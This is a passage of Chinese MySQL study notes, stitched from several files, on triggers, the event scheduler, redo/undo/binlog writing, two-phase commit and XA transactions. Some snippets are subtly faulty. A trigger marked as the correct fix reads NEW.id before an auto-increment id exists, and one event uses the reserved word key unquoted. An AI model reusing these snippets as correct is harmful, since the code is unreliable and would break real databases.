BEGIN
    SET NEW.updated_at = NOW();
END //

-- 自动生成订单编号
CREATE TRIGGER before_order_insert2
BEFORE INSERT ON orders
FOR EACH ROW
BEGIN
    IF NEW.order_no IS NULL THEN
        SET NEW.order_no = CONCAT('ORD', DATE_FORMAT(NOW(), '%Y%m%d'),
            LPAD((SELECT COUNT(*) FROM orders WHERE order_date = CURDATE()) + 1, 4, '0'));
    END IF;
END //

DELIMITER ;
```

## 3. AFTER 触发器

### 3.1 审计日志

```sql
DELIMITER //

-- 通用审计触发器
CREATE TRIGGER after_product_insert
AFTER INSERT ON products
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (table_name, record_id, action, new_data, action_time)
    VALUES ('products', NEW.id, 'INSERT',
            JSON_OBJECT('name', NEW.name, 'price', NEW.price, 'stock', NEW.stock),
            NOW());
END //

CREATE TRIGGER after_product_update
AFTER UPDATE ON products
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (table_name, record_id, action, old_data, new_data, action_time)
    VALUES ('products', NEW.id, 'UPDATE',
            JSON_OBJECT('name', OLD.name, 'price', OLD.price, 'stock', OLD.stock),
            JSON_OBJECT('name', NEW.name, 'price', NEW.price, 'stock', NEW.stock),
            NOW());
END //

CREATE TRIGGER after_product_delete
AFTER DELETE ON products
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (table_name, record_id, action, old_data, action_time)
    VALUES ('products', OLD.id, 'DELETE',
            JSON_OBJECT('name', OLD.name, 'price', OLD.price, 'stock', OLD.stock),
            NOW());
END //

DELIMITER ;
```

### 3.2 数据同步

```sql
DELIMITER //

-- 订单创建后更新库存
CREATE TRIGGER after_order_item_insert
AFTER INSERT ON order_items
FOR EACH ROW
BEGIN
    UPDATE products
    SET stock = stock - NEW.quantity
    WHERE id = NEW.product_id;
END //

-- 订单取消后恢复库存
CREATE TRIGGER after_order_item_delete
AFTER DELETE ON order_items
FOR EACH ROW
BEGIN
    UPDATE products
    SET stock = stock + OLD.quantity
    WHERE id = OLD.product_id;
END //

-- 更新客户统计信息
CREATE TRIGGER after_order_insert
AFTER INSERT ON orders
FOR EACH ROW
BEGIN
    UPDATE customers
    SET total_orders = total_orders + 1,
        total_spent = total_spent + NEW.total_amount,
        last_order_date = NEW.order_date
    WHERE id = NEW.customer_id;
END //

DELIMITER ;
```

## 4. 事件调度器

### 4.1 启用事件调度器

```sql
-- 检查事件调度器状态
SHOW VARIABLES LIKE 'event_scheduler';

-- 启用事件调度器
SET GLOBAL event_scheduler = ON;

-- 永久启用（my.cnf）
-- event_scheduler = ON
```

### 4.2 创建定时事件

```sql
DELIMITER //

-- 每天凌晨清理过期会话
CREATE EVENT IF NOT EXISTS cleanup_expired_sessions
ON SCHEDULE EVERY 1 DAY
STARTS CURRENT_DATE + INTERVAL 1 DAY + INTERVAL 2 HOUR
DO
BEGIN
    DELETE FROM sessions WHERE expires_at < NOW();
    INSERT INTO event_log (event_name, executed_at, rows_affected)
    VALUES ('cleanup_expired_sessions', NOW(), ROW_COUNT());
END //

-- 每小时更新热门商品
CREATE EVENT IF NOT EXISTS update_hot_products
ON SCHEDULE EVERY 1 HOUR
DO
BEGIN
    TRUNCATE TABLE hot_products;
    INSERT INTO hot_products (product_id, view_count, sales_count)
    SELECT p.id, p.view_count, COALESCE(SUM(oi.quantity), 0)
    FROM products p
    LEFT JOIN order_items oi ON p.id = oi.product_id
    WHERE p.created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)
    GROUP BY p.id
    ORDER BY p.view_count DESC, sales_count DESC
    LIMIT 100;
END //

-- 每月1号生成统计报表
CREATE EVENT IF NOT EXISTS monthly_report
ON SCHEDULE EVERY 1 MONTH
STARTS '2026-07-01 00:00:00'
DO
BEGIN
    INSERT INTO monthly_reports (report_month, total_orders, total_revenue, new_users)
    SELECT
        DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL 1 MONTH), '%Y-%m'),
        (SELECT COUNT(*) FROM orders WHERE order_date >= DATE_SUB(CURDATE(), INTERVAL 1 MONTH)
         AND order_date < CURDATE()),
        (SELECT COALESCE(SUM(total_amount), 0) FROM orders
         WHERE order_date >= DATE_SUB(CURDATE(), INTERVAL 1 MONTH)
         AND order_date < CURDATE()),
        (SELECT COUNT(*) FROM users WHERE created_at >= DATE_SUB(CURDATE(), INTERVAL 1 MONTH)
         AND created_at < CURDATE());
END //

-- 一次性事件：5分钟后执行
CREATE EVENT IF NOT EXISTS one_time_task
ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 5 MINUTE
DO
BEGIN
    UPDATE system_config SET value = 'initialized' WHERE key = 'status';
END //

DELIMITER ;
```

### 4.3 管理事件

```sql
-- 查看所有事件
SHOW EVENTS;

-- 查看事件详情
SHOW CREATE EVENT cleanup_expired_sessions;

-- 禁用事件
ALTER EVENT cleanup_expired_sessions DISABLE;

-- 启用事件
ALTER EVENT cleanup_expired_sessions ENABLE;

-- 修改事件调度
ALTER EVENT cleanup_expired_sessions
ON SCHEDULE EVERY 2 DAY;

-- 删除事件
DROP EVENT IF EXISTS one_time_task;

-- 从information_schema查询
SELECT event_name, status, interval_value, interval_field, last_executed
FROM information_schema.events
WHERE event_schema = 'mydb';
```

## 5. 常见问题与解决方案

### 5.1 触发器导致的性能问题

```sql
-- 问题：触发器链式执行导致性能下降
-- 解决方案：
-- 1. 避免触发器中触发其他触发器
-- 2. 触发器逻辑尽量简单
-- 3. 批量操作时考虑临时禁用触发器

-- 临时禁用触发器（MySQL不直接支持，需删除重建）
-- 替代方案：使用标志变量控制
DELIMITER //
CREATE TRIGGER conditional_trigger
BEFORE UPDATE ON products
FOR EACH ROW
BEGIN
    IF @skip_trigger IS NULL OR @skip_trigger = 0 THEN
        -- 触发器逻辑
        SET NEW.updated_at = NOW();
    END IF;
END //
DELIMITER ;

-- 批量操作时跳过触发器
SET @skip_trigger = 1;
UPDATE products SET price = price * 1.1;  -- 不触发更新时间
SET @skip_trigger = 0;
```

### 5.2 触发器中的死锁

```sql
-- 问题：触发器中修改同一张表导致死锁
-- 解决方案：BEFORE触发器中修改NEW值而非执行UPDATE

-- 错误：AFTER触发器中UPDATE原表
CREATE TRIGGER bad_trigger
AFTER INSERT ON orders
FOR EACH ROW
BEGIN
    UPDATE orders SET order_no = CONCAT('ORD', NEW.id);  -- 可能死锁
END //

-- 正确：BEFORE触发器中设置NEW值
CREATE TRIGGER good_trigger
BEFORE INSERT ON orders
FOR EACH ROW
BEGIN
    SET NEW.order_no = CONCAT('ORD', NEW.id);
END //
```

### 5.3 事件调度器未运行

```sql
-- 检查状态
SHOW VARIABLES LIKE 'event_scheduler';

-- 如果为OFF，需要启用
SET GLOBAL event_scheduler = ON;

-- 确保MySQL配置文件中设置了
-- event_scheduler = ON

-- 检查事件执行历史
SELECT * FROM information_schema.events
WHERE status = 'DISABLED';
```

## 6. 总结与最佳实践

### 6.1 触发器使用原则

1. **保持简单**：触发器逻辑应尽量简短
2. **避免链式触发**：不要让触发器引发其他触发器
3. **BEFORE做验证**：数据验证和自动填充用BEFORE
4. **AFTER做同步**：日志记录和数据同步用AFTER
5. **文档化**：记录触发器的用途和影响

### 6.2 事件调度器原则

1. **错峰执行**：定时任务安排在低峰期
2. **添加日志**：事件执行后记录日志
3. **错误处理**：事件中包含异常处理
4. **监控执行**：定期检查事件执行状态
5. **幂等设计**：事件重复执行不应产生错误数据
## 触发器基础

**换行写法：创建插入后触发器**
`CREATE TRIGGER <触发器名> AFTER INSERT ON <表名> FOR EACH ROW BEGIN <触发体> END`
```sql
-- 插入后记录审计日志
DELIMITER //
CREATE TRIGGER after_user_insert
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    INSERT INTO user_audit_log (user_id, action, action_time, details)
    VALUES (NEW.id, 'INSERT', NOW(), CONCAT('Created user: ', NEW.username));
END //
DELIMITER ;
```

**单行写法：删除触发器**
`DROP TRIGGER [IF EXISTS] <触发器名>`
```sql
-- 删除触发器
DROP TRIGGER IF EXISTS before_user_insert;
```

---

## NEW 与 OLD 关键字

**换行写法：NEW 关键字访问新数据**
`NEW.<列名>`
```sql
-- 更新前比较新旧值并记录变更
DELIMITER //
CREATE TRIGGER before_user_update
BEFORE UPDATE ON users
FOR EACH ROW
BEGIN
    IF OLD.username != NEW.username THEN
        INSERT INTO user_change_log (user_id, field_name, old_value, new_value, changed_at)
        VALUES (OLD.id, 'username', OLD.username, NEW.username, NOW());
    END IF;
END //
DELIMITER ;
```

**换行写法：OLD 关键字访问旧数据**
`OLD.<列名>`
```sql
-- 删除后记录被删除的数据
DELIMITER //
CREATE TRIGGER after_user_delete
AFTER DELETE ON users
FOR EACH ROW
BEGIN
    INSERT INTO user_delete_log (user_id, username, deleted_at)
    VALUES (OLD.id, OLD.username, NOW());
END //
DELIMITER ;
```

---

## BEFORE 触发器

**换行写法：BEFORE 触发器数据验证**
`SIGNAL SQLSTATE '<状态码>' SET MESSAGE_TEXT = '<错误信息>'`
```sql
-- 更新前验证薪资不能低于最低标准
DELIMITER //
CREATE TRIGGER before_salary_update
BEFORE UPDATE ON employees
FOR EACH ROW
BEGIN
    IF NEW.salary < 3000 THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = '薪资不能低于最低标准3000元';
    END IF;
END //
DELIMITER ;
```

**换行写法：BEFORE 触发器验证订单金额**
`SIGNAL SQLSTATE '<状态码>' SET MESSAGE_TEXT = '<错误信息>'`
```sql
-- 插入前验证订单金额必须大于 0
DELIMITER //
CREATE TRIGGER before_order_insert
BEFORE INSERT ON orders
FOR EACH ROW
BEGIN
    IF NEW.total_amount <= 0 THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = '订单金额必须大于0';
    END IF;
END //
DELIMITER ;
```

**换行写法：BEFORE 触发器自动计算字段**
`SET NEW.<列名> = <值>`
```sql
-- 插入前自动计算商品总价
DELIMITER //
CREATE TRIGGER before_order_item_insert
BEFORE INSERT ON order_items
FOR EACH ROW
BEGIN
    SET NEW.line_total = NEW.quantity * NEW.unit_price;
END //
DELIMITER ;
```

**换行写法：BEFORE 触发器自动更新时间**
`SET NEW.<列名> = NOW()`
```sql
-- 更新前自动维护修改时间
DELIMITER //
CREATE TRIGGER before_product_update
BEFORE UPDATE ON products
FOR EACH ROW
BEGIN
    SET NEW.updated_at = NOW();
END //
DELIMITER ;
```

**换行写法：BEFORE 触发器自动生成编号**
`SET NEW.<列名> = <生成表达式>`
```sql
-- 插入前自动生成订单编号
DELIMITER //
CREATE TRIGGER before_order_insert2
BEFORE INSERT ON orders
FOR EACH ROW
BEGIN
    IF NEW.order_no IS NULL THEN
        SET NEW.order_no = CONCAT('ORD', DATE_FORMAT(NOW(), '%Y%m%d'),
            LPAD((SELECT COUNT(*) FROM orders WHERE order_date = CURDATE()) + 1, 4, '0'));
    END IF;
END //
DELIMITER ;
```

---

## AFTER 触发器

**换行写法：AFTER 插入审计**
`INSERT INTO <日志表> VALUES (NEW.<列名>...)`
```sql
-- 插入后记录产品审计日志
DELIMITER //
CREATE TRIGGER after_product_insert
AFTER INSERT ON products
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (table_name, record_id, action, new_data, action_time)
    VALUES ('products', NEW.id, 'INSERT',
            JSON_OBJECT('name', NEW.name, 'price', NEW.price, 'stock', NEW.stock),
            NOW());
END //
DELIMITER ;
```

**换行写法：AFTER 更新审计**
`INSERT INTO <日志表> VALUES (OLD.<列名>..., NEW.<列名>...)`
```sql
-- 更新后记录新旧数据审计日志
DELIMITER //
CREATE TRIGGER after_product_update
AFTER UPDATE ON products
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (table_name, record_id, action, old_data, new_data, action_time)
    VALUES ('products', NEW.id, 'UPDATE',
            JSON_OBJECT('name', OLD.name, 'price', OLD.price, 'stock', OLD.stock),
            JSON_OBJECT('name', NEW.name, 'price', NEW.price, 'stock', NEW.stock),
            NOW());
END //
DELIMITER ;
```

**换行写法：AFTER 删除审计**
`INSERT INTO <日志表> VALUES (OLD.<列名>...)`
```sql
-- 删除后记录被删除数据审计日志
DELIMITER //
CREATE TRIGGER after_product_delete
AFTER DELETE ON products
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (table_name, record_id, action, old_data, action_time)
    VALUES ('products', OLD.id, 'DELETE',
            JSON_OBJECT('name', OLD.name, 'price', OLD.price, 'stock', OLD.stock),
            NOW());
END //
DELIMITER ;
```

**换行写法：AFTER 触发器扣减库存**
`UPDATE <关联表> SET <列名> = <列名> - NEW.<列名> WHERE <条件>`
```sql
-- 订单项插入后扣减商品库存
DELIMITER //
CREATE TRIGGER after_order_item_insert
AFTER INSERT ON order_items
FOR EACH ROW
BEGIN
    UPDATE products
    SET stock = stock - NEW.quantity
    WHERE id = NEW.product_id;
END //
DELIMITER ;
```

**换行写法：AFTER 触发器恢复库存**
`UPDATE <关联表> SET <列名> = <列名> + OLD.<列名> WHERE <条件>`
```sql
-- 订单项删除后恢复商品库存
DELIMITER //
CREATE TRIGGER after_order_item_delete
AFTER DELETE ON order_items
FOR EACH ROW
BEGIN
    UPDATE products
    SET stock = stock + OLD.quantity
    WHERE id = OLD.product_id;
END //
DELIMITER ;
```

**换行写法：AFTER 触发器更新统计**
`UPDATE <统计表> SET <列名> = <列名> + NEW.<列名> WHERE <条件>`
```sql
-- 订单插入后更新客户统计信息
DELIMITER //
CREATE TRIGGER after_order_insert
AFTER INSERT ON orders
FOR EACH ROW
BEGIN
    UPDATE customers
    SET total_orders = total_orders + 1,
        total_spent = total_spent + NEW.total_amount,
        last_order_date = NEW.order_date
    WHERE id = NEW.customer_id;
END //
DELIMITER ;
```

---

## 事件调度器

**单行写法：查看调度器状态**
`SHOW VARIABLES LIKE 'event_scheduler'`
```sql
-- 检查事件调度器状态
SHOW VARIABLES LIKE 'event_scheduler';
```

**单行写法：启用调度器**
`SET GLOBAL event_scheduler = ON`
```sql
-- 启用事件调度器
SET GLOBAL event_scheduler = ON;
```

**换行写法：创建每日定时事件**
`CREATE EVENT [IF NOT EXISTS] <事件名> ON SCHEDULE EVERY 1 DAY [STARTS <时间>] DO BEGIN <事件体> END`
```sql
-- 每天凌晨清理过期会话
DELIMITER //
CREATE EVENT IF NOT EXISTS cleanup_expired_sessions
ON SCHEDULE EVERY 1 DAY
STARTS CURRENT_DATE + INTERVAL 1 DAY + INTERVAL 2 HOUR
DO
BEGIN
    DELETE FROM sessions WHERE expires_at < NOW();
    INSERT INTO event_log (event_name, executed_at, rows_affected)
    VALUES ('cleanup_expired_sessions', NOW(), ROW_COUNT());
END //
DELIMITER ;
```

**换行写法：创建每小时定时事件**
`CREATE EVENT [IF NOT EXISTS] <事件名> ON SCHEDULE EVERY 1 HOUR DO BEGIN <事件体> END`
```sql
-- 每小时更新热门商品
DELIMITER //
CREATE EVENT IF NOT EXISTS update_hot_products
ON SCHEDULE EVERY 1 HOUR
DO
BEGIN
    TRUNCATE TABLE hot_products;
    INSERT INTO hot_products (product_id, view_count, sales_count)
    SELECT p.id, p.view_count, COALESCE(SUM(oi.quantity), 0)
    FROM products p
    LEFT JOIN order_items oi ON p.id = oi.product_id
    WHERE p.created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)
    GROUP BY p.id
    ORDER BY p.view_count DESC, sales_count DESC
    LIMIT 100;
END //
DELIMITER ;
```

**换行写法：创建每月定时事件**
`CREATE EVENT [IF NOT EXISTS] <事件名> ON SCHEDULE EVERY 1 MONTH STARTS '<时间>' DO BEGIN <事件体> END`
```sql
-- 每月 1 号生成统计报表
DELIMITER //
CREATE EVENT IF NOT EXISTS monthly_report
ON SCHEDULE EVERY 1 MONTH
STARTS '2026-07-01 00:00:00'
DO
BEGIN
    INSERT INTO monthly_reports (report_month, total_orders, total_revenue, new_users)
    SELECT
        DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL 1 MONTH), '%Y-%m'),
        (SELECT COUNT(*) FROM orders WHERE order_date >= DATE_SUB(CURDATE(), INTERVAL 1 MONTH)
         AND order_date < CURDATE()),
        (SELECT COALESCE(SUM(total_amount), 0) FROM orders
         WHERE order_date >= DATE_SUB(CURDATE(), INTERVAL 1 MONTH)
         AND order_date < CURDATE()),
        (SELECT COUNT(*) FROM users WHERE created_at >= DATE_SUB(CURDATE(), INTERVAL 1 MONTH)
         AND created_at < CURDATE());
END //
DELIMITER ;
```

**换行写法：创建一次性事件**
`CREATE EVENT <事件名> ON SCHEDULE AT <时间> DO BEGIN <事件体> END`
```sql
-- 5 分钟后执行一次性任务
DELIMITER //
CREATE EVENT IF NOT EXISTS one_time_task
ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 5 MINUTE
DO
BEGIN
    UPDATE system_config SET value = 'initialized' WHERE key = 'status';
END //
DELIMITER ;
```

**单行写法：查看所有事件**
`SHOW EVENTS`
```sql
-- 查看所有事件
SHOW EVENTS;
```

**单行写法：查看事件详情**
`SHOW CREATE EVENT <事件名>`
```sql
-- 查看事件定义详情
SHOW CREATE EVENT cleanup_expired_sessions;
```

**单行写法：禁用事件**
`ALTER EVENT <事件名> DISABLE`
```sql
-- 禁用指定事件
ALTER EVENT cleanup_expired_sessions DISABLE;
```

**单行写法：启用事件**
`ALTER EVENT <事件名> ENABLE`
```sql
-- 启用指定事件
ALTER EVENT cleanup_expired_sessions ENABLE;
```

**单行写法：修改事件调度周期**
`ALTER EVENT <事件名> ON SCHEDULE EVERY <间隔>`
```sql
-- 修改事件的调度周期
ALTER EVENT cleanup_expired_sessions
ON SCHEDULE EVERY 2 DAY;
```

**单行写法：删除事件**
`DROP EVENT [IF EXISTS] <事件名>`
```sql
-- 删除事件
DROP EVENT IF EXISTS one_time_task;
```

**换行写法：查询事件信息**
`SELECT <列名> FROM information_schema.events WHERE <条件>`
```sql
-- 从 information_schema 查询事件信息
SELECT event_name, status, interval_value, interval_field, last_executed
FROM information_schema.events
WHERE event_schema = 'mydb';
```

---

## 条件触发器

**换行写法：使用标志变量控制触发器**
`IF @<变量名> IS NULL OR @<变量名> = 0 THEN <逻辑> END IF`
```sql
-- 批量操作时通过标志变量跳过触发器逻辑
DELIMITER //
CREATE TRIGGER conditional_trigger
BEFORE UPDATE ON products
FOR EACH ROW
BEGIN
    IF @skip_trigger IS NULL OR @skip_trigger = 0 THEN
        SET NEW.updated_at = NOW();
    END IF;
END //
DELIMITER ;
```

**换行写法：批量操作时设置标志变量**
`SET @<变量名> = <值>`
```sql
-- 批量更新时设置标志变量跳过触发器
SET @skip_trigger = 1;
UPDATE products SET price = price * 1.1;
SET @skip_trigger = 0;
```

<!-- ============ 文档分隔线：020-mysql/067-RedoUndoBinlogWriteTiming.md ============ -->

## 1. 三种日志概览

### 1.1 日志定位

| 日志     | 层级          | 作用                   | 写入方式       |
| -------- | ------------- | ---------------------- | -------------- |
| Redo Log | InnoDB 引擎层 | 崩溃恢复（crash-safe） | 顺序写，循环写 |
| Undo Log | InnoDB 引擎层 | 事务回滚 + MVCC 版本链 | 随机写         |
| Binlog   | Server 层     | 主从复制 + 数据恢复    | 顺序写，追加写 |

### 1.2 日志内容对比

```
Redo Log:  记录"物理修改"——某页某偏移量写入了什么数据
Undo Log:  记录"逻辑反向"——如何将数据恢复到修改前
Binlog:    记录"逻辑操作"——执行了什么 SQL 语句（STATEMENT）或行变更（ROW）
```

## 2. Redo Log 写入机制

### 2.1 Redo Log 架构

```mermaid
flowchart TD
    BP[InnoDB Buffer Pool<br/>脏页 Dirty Pages] -->|刷盘 Checkpoint| RL[Redo Log Files ib_logfile0/1<br/>write pos → checkpoint 之间的区域]
```

### 2.2 写入流程

```
1. 事务修改数据页 → 生成 Redo Record
2. 写入 Redo Log Buffer（内存）
3. 写入 OS Buffer Cache（write）
4. 刷盘到 Redo Log File（fsync）
```

### 2.3 刷盘策略（innodb_flush_log_at_trx_commit）

| 值  | 行为                       | 安全性       | 性能 |
| --- | -------------------------- | ------------ | ---- |
| 0   | 每秒刷盘一次               | 丢失1秒数据  | 最高 |
| 1   | 每次提交都 fsync           | 不丢数据     | 最低 |
| 2   | 每次提交 write，每秒 fsync | OS崩溃丢数据 | 中等 |

```sql
-- 查看当前设置
SHOW VARIABLES LIKE 'innodb_flush_log_at_trx_commit';

-- 生产推荐：设为 1（最安全）
SET GLOBAL innodb_flush_log_at_trx_commit = 1;
```

### 2.4 Redo Log 组提交（Group Commit）

多个事务同时提交时，只需一次 fsync：

```
事务A提交 → 进入 fsync 队列
事务B提交 → 进入 fsync 队列  ──→ 一次 fsync 刷入所有 Redo
事务C提交 → 进入 fsync 队列
```

## 3. Undo Log 写入机制

### 3.1 Undo Log 的双重作用

1. **事务回滚**：保存修改前的数据，ROLLBACK 时恢复
2. **MVCC 版本链**：通过 `DB_ROLL_PTR` 串联历史版本

### 3.2 写入时机

```
1. 事务执行 UPDATE/DELETE → 先将旧值写入 Undo Log
2. 事务执行 INSERT → 写入 Undo Log（记录主键值，用于回滚时删除）
3. 事务 COMMIT → Undo Log 标记为可清理（但不立即删除，供 MVCC 使用）
4. 当没有事务需要访问该 Undo Log → 由 Purge 线程清理
```

### 3.3 Undo Log 类型

| 类型        | 对应操作      | 回滚操作                   |
| ----------- | ------------- | -------------------------- |
| INSERT Undo | INSERT        | DELETE                     |
| UPDATE Undo | UPDATE/DELETE | UPDATE（恢复旧值）/ INSERT |

### 3.4 Undo Log 与 MVCC 的关系

```
事务A (trx_id=100) 修改行: name='Alice' → 'Bob'

当前行: {name='Bob', trx_id=100, roll_ptr→undo_1}
                                        ↓
Undo Log: {name='Alice', trx_id=50, roll_ptr→undo_2}

事务B (trx_id=200) 快照读:
  ReadView: m_ids=[100], min_trx_id=100
  → trx_id=100 在 m_ids 中，不可见
  → 遍历到 undo_1: trx_id=50 < min_trx_id，可见
  → 返回 name='Alice'
```

## 4. Binlog 写入机制

### 4.1 Binlog 格式

| 格式      | 内容         | 优缺点                                            |
| --------- | ------------ | ------------------------------------------------- |
| STATEMENT | SQL 语句     | 日志量小，但不确定函数（NOW()、UUID()）导致不一致 |
| ROW       | 行变更前后值 | 数据一致性好，但日志量大                          |
| MIXED     | 混合模式     | 默认 STATEMENT，不确定函数切 ROW                  |

### 4.2 写入流程

```
1. 事务执行 DML → 写入 Binlog Cache（线程级内存）
2. 事务 COMMIT → Binlog Cache 写入 Binlog File
3. 根据 sync_binlog 设置决定 fsync 时机
```

### 4.3 刷盘策略（sync_binlog）

| 值  | 行为                   | 安全性        | 性能 |
| --- | ---------------------- | ------------- | ---- |
| 0   | 由 OS 决定何时 fsync   | 可能丢数据    | 最高 |
| 1   | 每次提交都 fsync       | 不丢数据      | 最低 |
| N   | 每 N 次提交 fsync 一次 | 丢 N-1 个事务 | 中等 |

```sql
-- 生产推荐：设为 1
SET GLOBAL sync_binlog = 1;
```

## 5. 三种日志的写入顺序

### 5.1 事务提交时的写入顺序

```
1. 写入 Undo Log（保证可回滚）
2. 写入 Redo Log（prepare 阶段）
3. 写入 Binlog
4. 写入 Redo Log（commit 阶段）
```

这就是**两阶段提交**的核心流程：

```mermaid
flowchart TD
    A[1. 写 Undo Log] --> B[2. 写 Redo Log prepare 状态]
    B --> C[3. 写 Binlog]
    C --> D[4. 写 Redo Log commit 状态]
```

### 5.2 为什么要两阶段提交

如果 Redo Log 和 Binlog 不保证一致性，主从数据会不一致：

```
场景1：先写 Redo Log，再写 Binlog（Redo 写完崩溃）
  主库：事务已提交（Redo Log 有记录）
  从库：事务未复制（Binlog 无记录）
  → 主从数据不一致！

场景2：先写 Binlog，再写 Redo Log（Binlog 写完崩溃）
  主库：事务未提交（Redo Log 无记录）
  从库：事务已复制（Binlog 有记录）
  → 主从数据不一致！

两阶段提交：
  崩溃恢复时检查 Redo Log 状态：
  - prepare + Binlog 完整 → 提交事务
  - prepare + Binlog 不完整 → 回滚事务
  → 保证主从数据一致！
```

## 延伸阅读
MySQL 索引与优化，见 020-mysql 模块文档。
MySQL 日志体系，见 020-mysql 模块 redo/binlog 文档。
Redis 缓存与 MySQL 组合，见 022-redis 模块。

<!-- ============ 文档分隔线：020-mysql/068-TwoPhaseCommit.md ============ -->

## 1. 两阶段提交的必要性

### 1.1 问题背景

InnoDB 的 Redo Log 和 Server 层的 Binlog 是两个独立的日志系统。如果不协调写入顺序，崩溃后会导致数据不一致：

```
主库执行: UPDATE accounts SET balance = balance - 100 WHERE id = 1;

情况1: Redo Log 写入成功，Binlog 未写入 → 主库已扣款，从库未扣款
情况2: Binlog 写入成功，Redo Log 未写入 → 主库未扣款，从库已扣款
```

### 1.2 两阶段提交方案

将事务提交分为 **Prepare** 和 **Commit** 两个阶段，中间插入 Binlog 写入：

```
阶段1 (Prepare):  写 Redo Log，标记为 prepare 状态
阶段间:           写 Binlog
阶段2 (Commit):   写 Redo Log，标记为 commit 状态
```

## 2. 两阶段提交流程

### 2.1 详细执行步骤

```mermaid
flowchart TD
    subgraph Exec[事务执行阶段]
        E1[1. 执行 SQL，修改数据页 Buffer Pool]
        E2[2. 生成 Undo Log 写入 Undo Tablespace]
        E3[3. 生成 Redo Record 写入 Redo Log Buffer]
    end
    subgraph Prep[Prepare 阶段]
        P1[4. 将 Redo Log Buffer 刷盘 fsync]
        P2[5. Redo Log 中标记事务为 XA_PREPARE]
        P3[6. 持有行锁，事务对外不可见]
    end
    subgraph Bin[Binlog 写入阶段]
        B1[7. 将 Binlog Cache 写入 Binlog File]
        B2[8. 根据 sync_binlog 设置决定是否 fsync]
    end
    subgraph Com[Commit 阶段]
        C1[9. 写 Redo Log commit 标记]
        C2[10. 释放行锁，事务对外可见]
        C3[11. 释放 Undo Log 标记为可清理]
    end
    Exec --> Prep --> Bin --> Com
```

### 2.2 组提交优化

多个事务同时提交时，可以合并 fsync 操作：

```mermaid
flowchart LR
    A[事务A] --> F[Flush Stage 一次fsync]
    B[事务B] --> F
    C[事务C] --> F
    F --> S[Sync Stage 一次fsync]
    S --> K[Commit Stage 顺序commit]
```

阶段1（Flush）：多个事务的 Redo Log 一起 fsync；阶段2（Sync）：多个事务的 Binlog 一起 fsync；阶段3（Commit）：依次标记 commit

## 3. 崩溃恢复

### 3.1 恢复流程

MySQL 重启时，InnoDB 扫描 Redo Log 进行崩溃恢复：

```
1. 从 Checkpoint 点开始扫描 Redo Log
2. 重做（Redo）：重放所有已提交事务的修改
3. 回滚（Undo）：撤销所有未提交事务的修改
4. 处理 XA PREPARE 状态的事务：
   a. 检查 Binlog 中是否有该事务的记录
   b. 有 → 提交事务（commit）
   c. 无 → 回滚事务（rollback）
```

### 3.2 各种崩溃场景分析

| 崩溃时机                  | Redo Log 状态 | Binlog 状态 | 恢复动作         |
| ------------------------- | ------------- | ----------- | ---------------- |
| Prepare 之前              | 无记录        | 无记录      | 无需恢复         |
| Prepare 之后、Binlog 之前 | prepare       | 无记录      | 回滚事务         |
| Binlog 之后、Commit 之前  | prepare       | 有记录      | 提交事务         |
| Commit 之后               | commit        | 有记录      | 已完成，无需处理 |

### 3.3 Binlog 完整性判断

```sql
-- MySQL 通过 XID（事务ID）匹配 Redo Log 和 Binlog
-- 每个 Binlog 事务组以 XID event 结尾

-- Binlog 中的事务格式：
-- BEGIN
-- ... (行变更事件)
-- XID 12345  ← 事务标识

-- 恢复时：在 Binlog 中查找 XID=12345
-- 找到 → 事务完整，提交
-- 找不到 → 事务不完整，回滚
```

## 4. XA 事务

### 4.1 外部 XA 事务

MySQL 支持 X/Open XA 规范，实现跨数据库的分布式事务：

```sql
-- XA 事务语法
XA START 'txn1';
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
XA END 'txn1';
XA PREPARE 'txn1';   -- 第一阶段：准备
-- 此时可以查询事务状态
XA RECOVER;
XA COMMIT 'txn1';    -- 第二阶段：提交
-- 或 XA ROLLBACK 'txn1';  -- 第二阶段：回滚
```

### 4.2 XA 事务状态机

```
START → END → PREPARE → COMMIT
                ↓
            ROLLBACK

状态: ACTIVE → IDLE → PREPARED → COMMITTED
                              → ROLLED_BACK
```

### 4.3 XA 事务的注意事项

- **悬挂事务**：PREPARE 后未 COMMIT 也未 ROLLBACK，占用锁资源
- **超时处理**：`xa_wait_timeout` 控制等待时间
- **监控**：定期执行 `XA RECOVER` 检查悬挂事务

```sql
-- 查看悬挂事务
XA RECOVER;

-- 手动回滚悬挂事务
XA ROLLBACK 'txn1';
```

## 5. 半同步复制与两阶段提交

### 5.1 半同步复制对两阶段提交的影响

```
异步复制:    主库提交 → 返回客户端 → 从库异步拉取 Binlog
半同步复制:  主库提交 → 等待至少1个从库确认收到 Binlog → 返回客户端
```

半同步复制在 Binlog 写入后增加了一个等待步骤：

```
Prepare → Binlog → 等待从库ACK → Commit
```

### 5.2 After Sync vs After Commit

| 模式         | 等待时机                 | 数据安全           | 性能 |
| ------------ | ------------------------ | ------------------ | ---- |
| After Sync   | Binlog 写入后、Commit 前 | 主库崩溃不丢数据   | 较好 |
| After Commit | Commit 后                | 主库崩溃可能丢数据 | 较差 |

```sql
-- MySQL 5.7+ 默认 After Sync
SET GLOBAL rpl_semi_sync_master_wait_point = AFTER_SYNC;
```

### 5.3 After Sync 的优势

```
After Sync 流程:
1. Prepare
2. 写 Binlog
3. 等待从库 ACK  ← 在 Commit 之前
4. Commit

如果主库在步骤3后崩溃：
- 从库已收到 Binlog → 从库会提交
- 主库未 Commit → 恢复时检查 Binlog 完整 → 提交
- 数据一致！
```

<!-- ============ 文档分隔线：020-mysql/069-GapLockNextKeyLockSolutionPhantomRead.md ============ -->

## 1. 幻读问题

### 1.1 什么是幻读

同一事务内，两次相同的范围查询返回了不同的行集：

```sql
-- RR 隔离级别
BEGIN;
-- 第一次查询：2行
SELECT * FROM users WHERE age BETWEEN 20 AND 30;
-- id=2, age=25 | id=5, age=28

-- 其他事务插入了一行
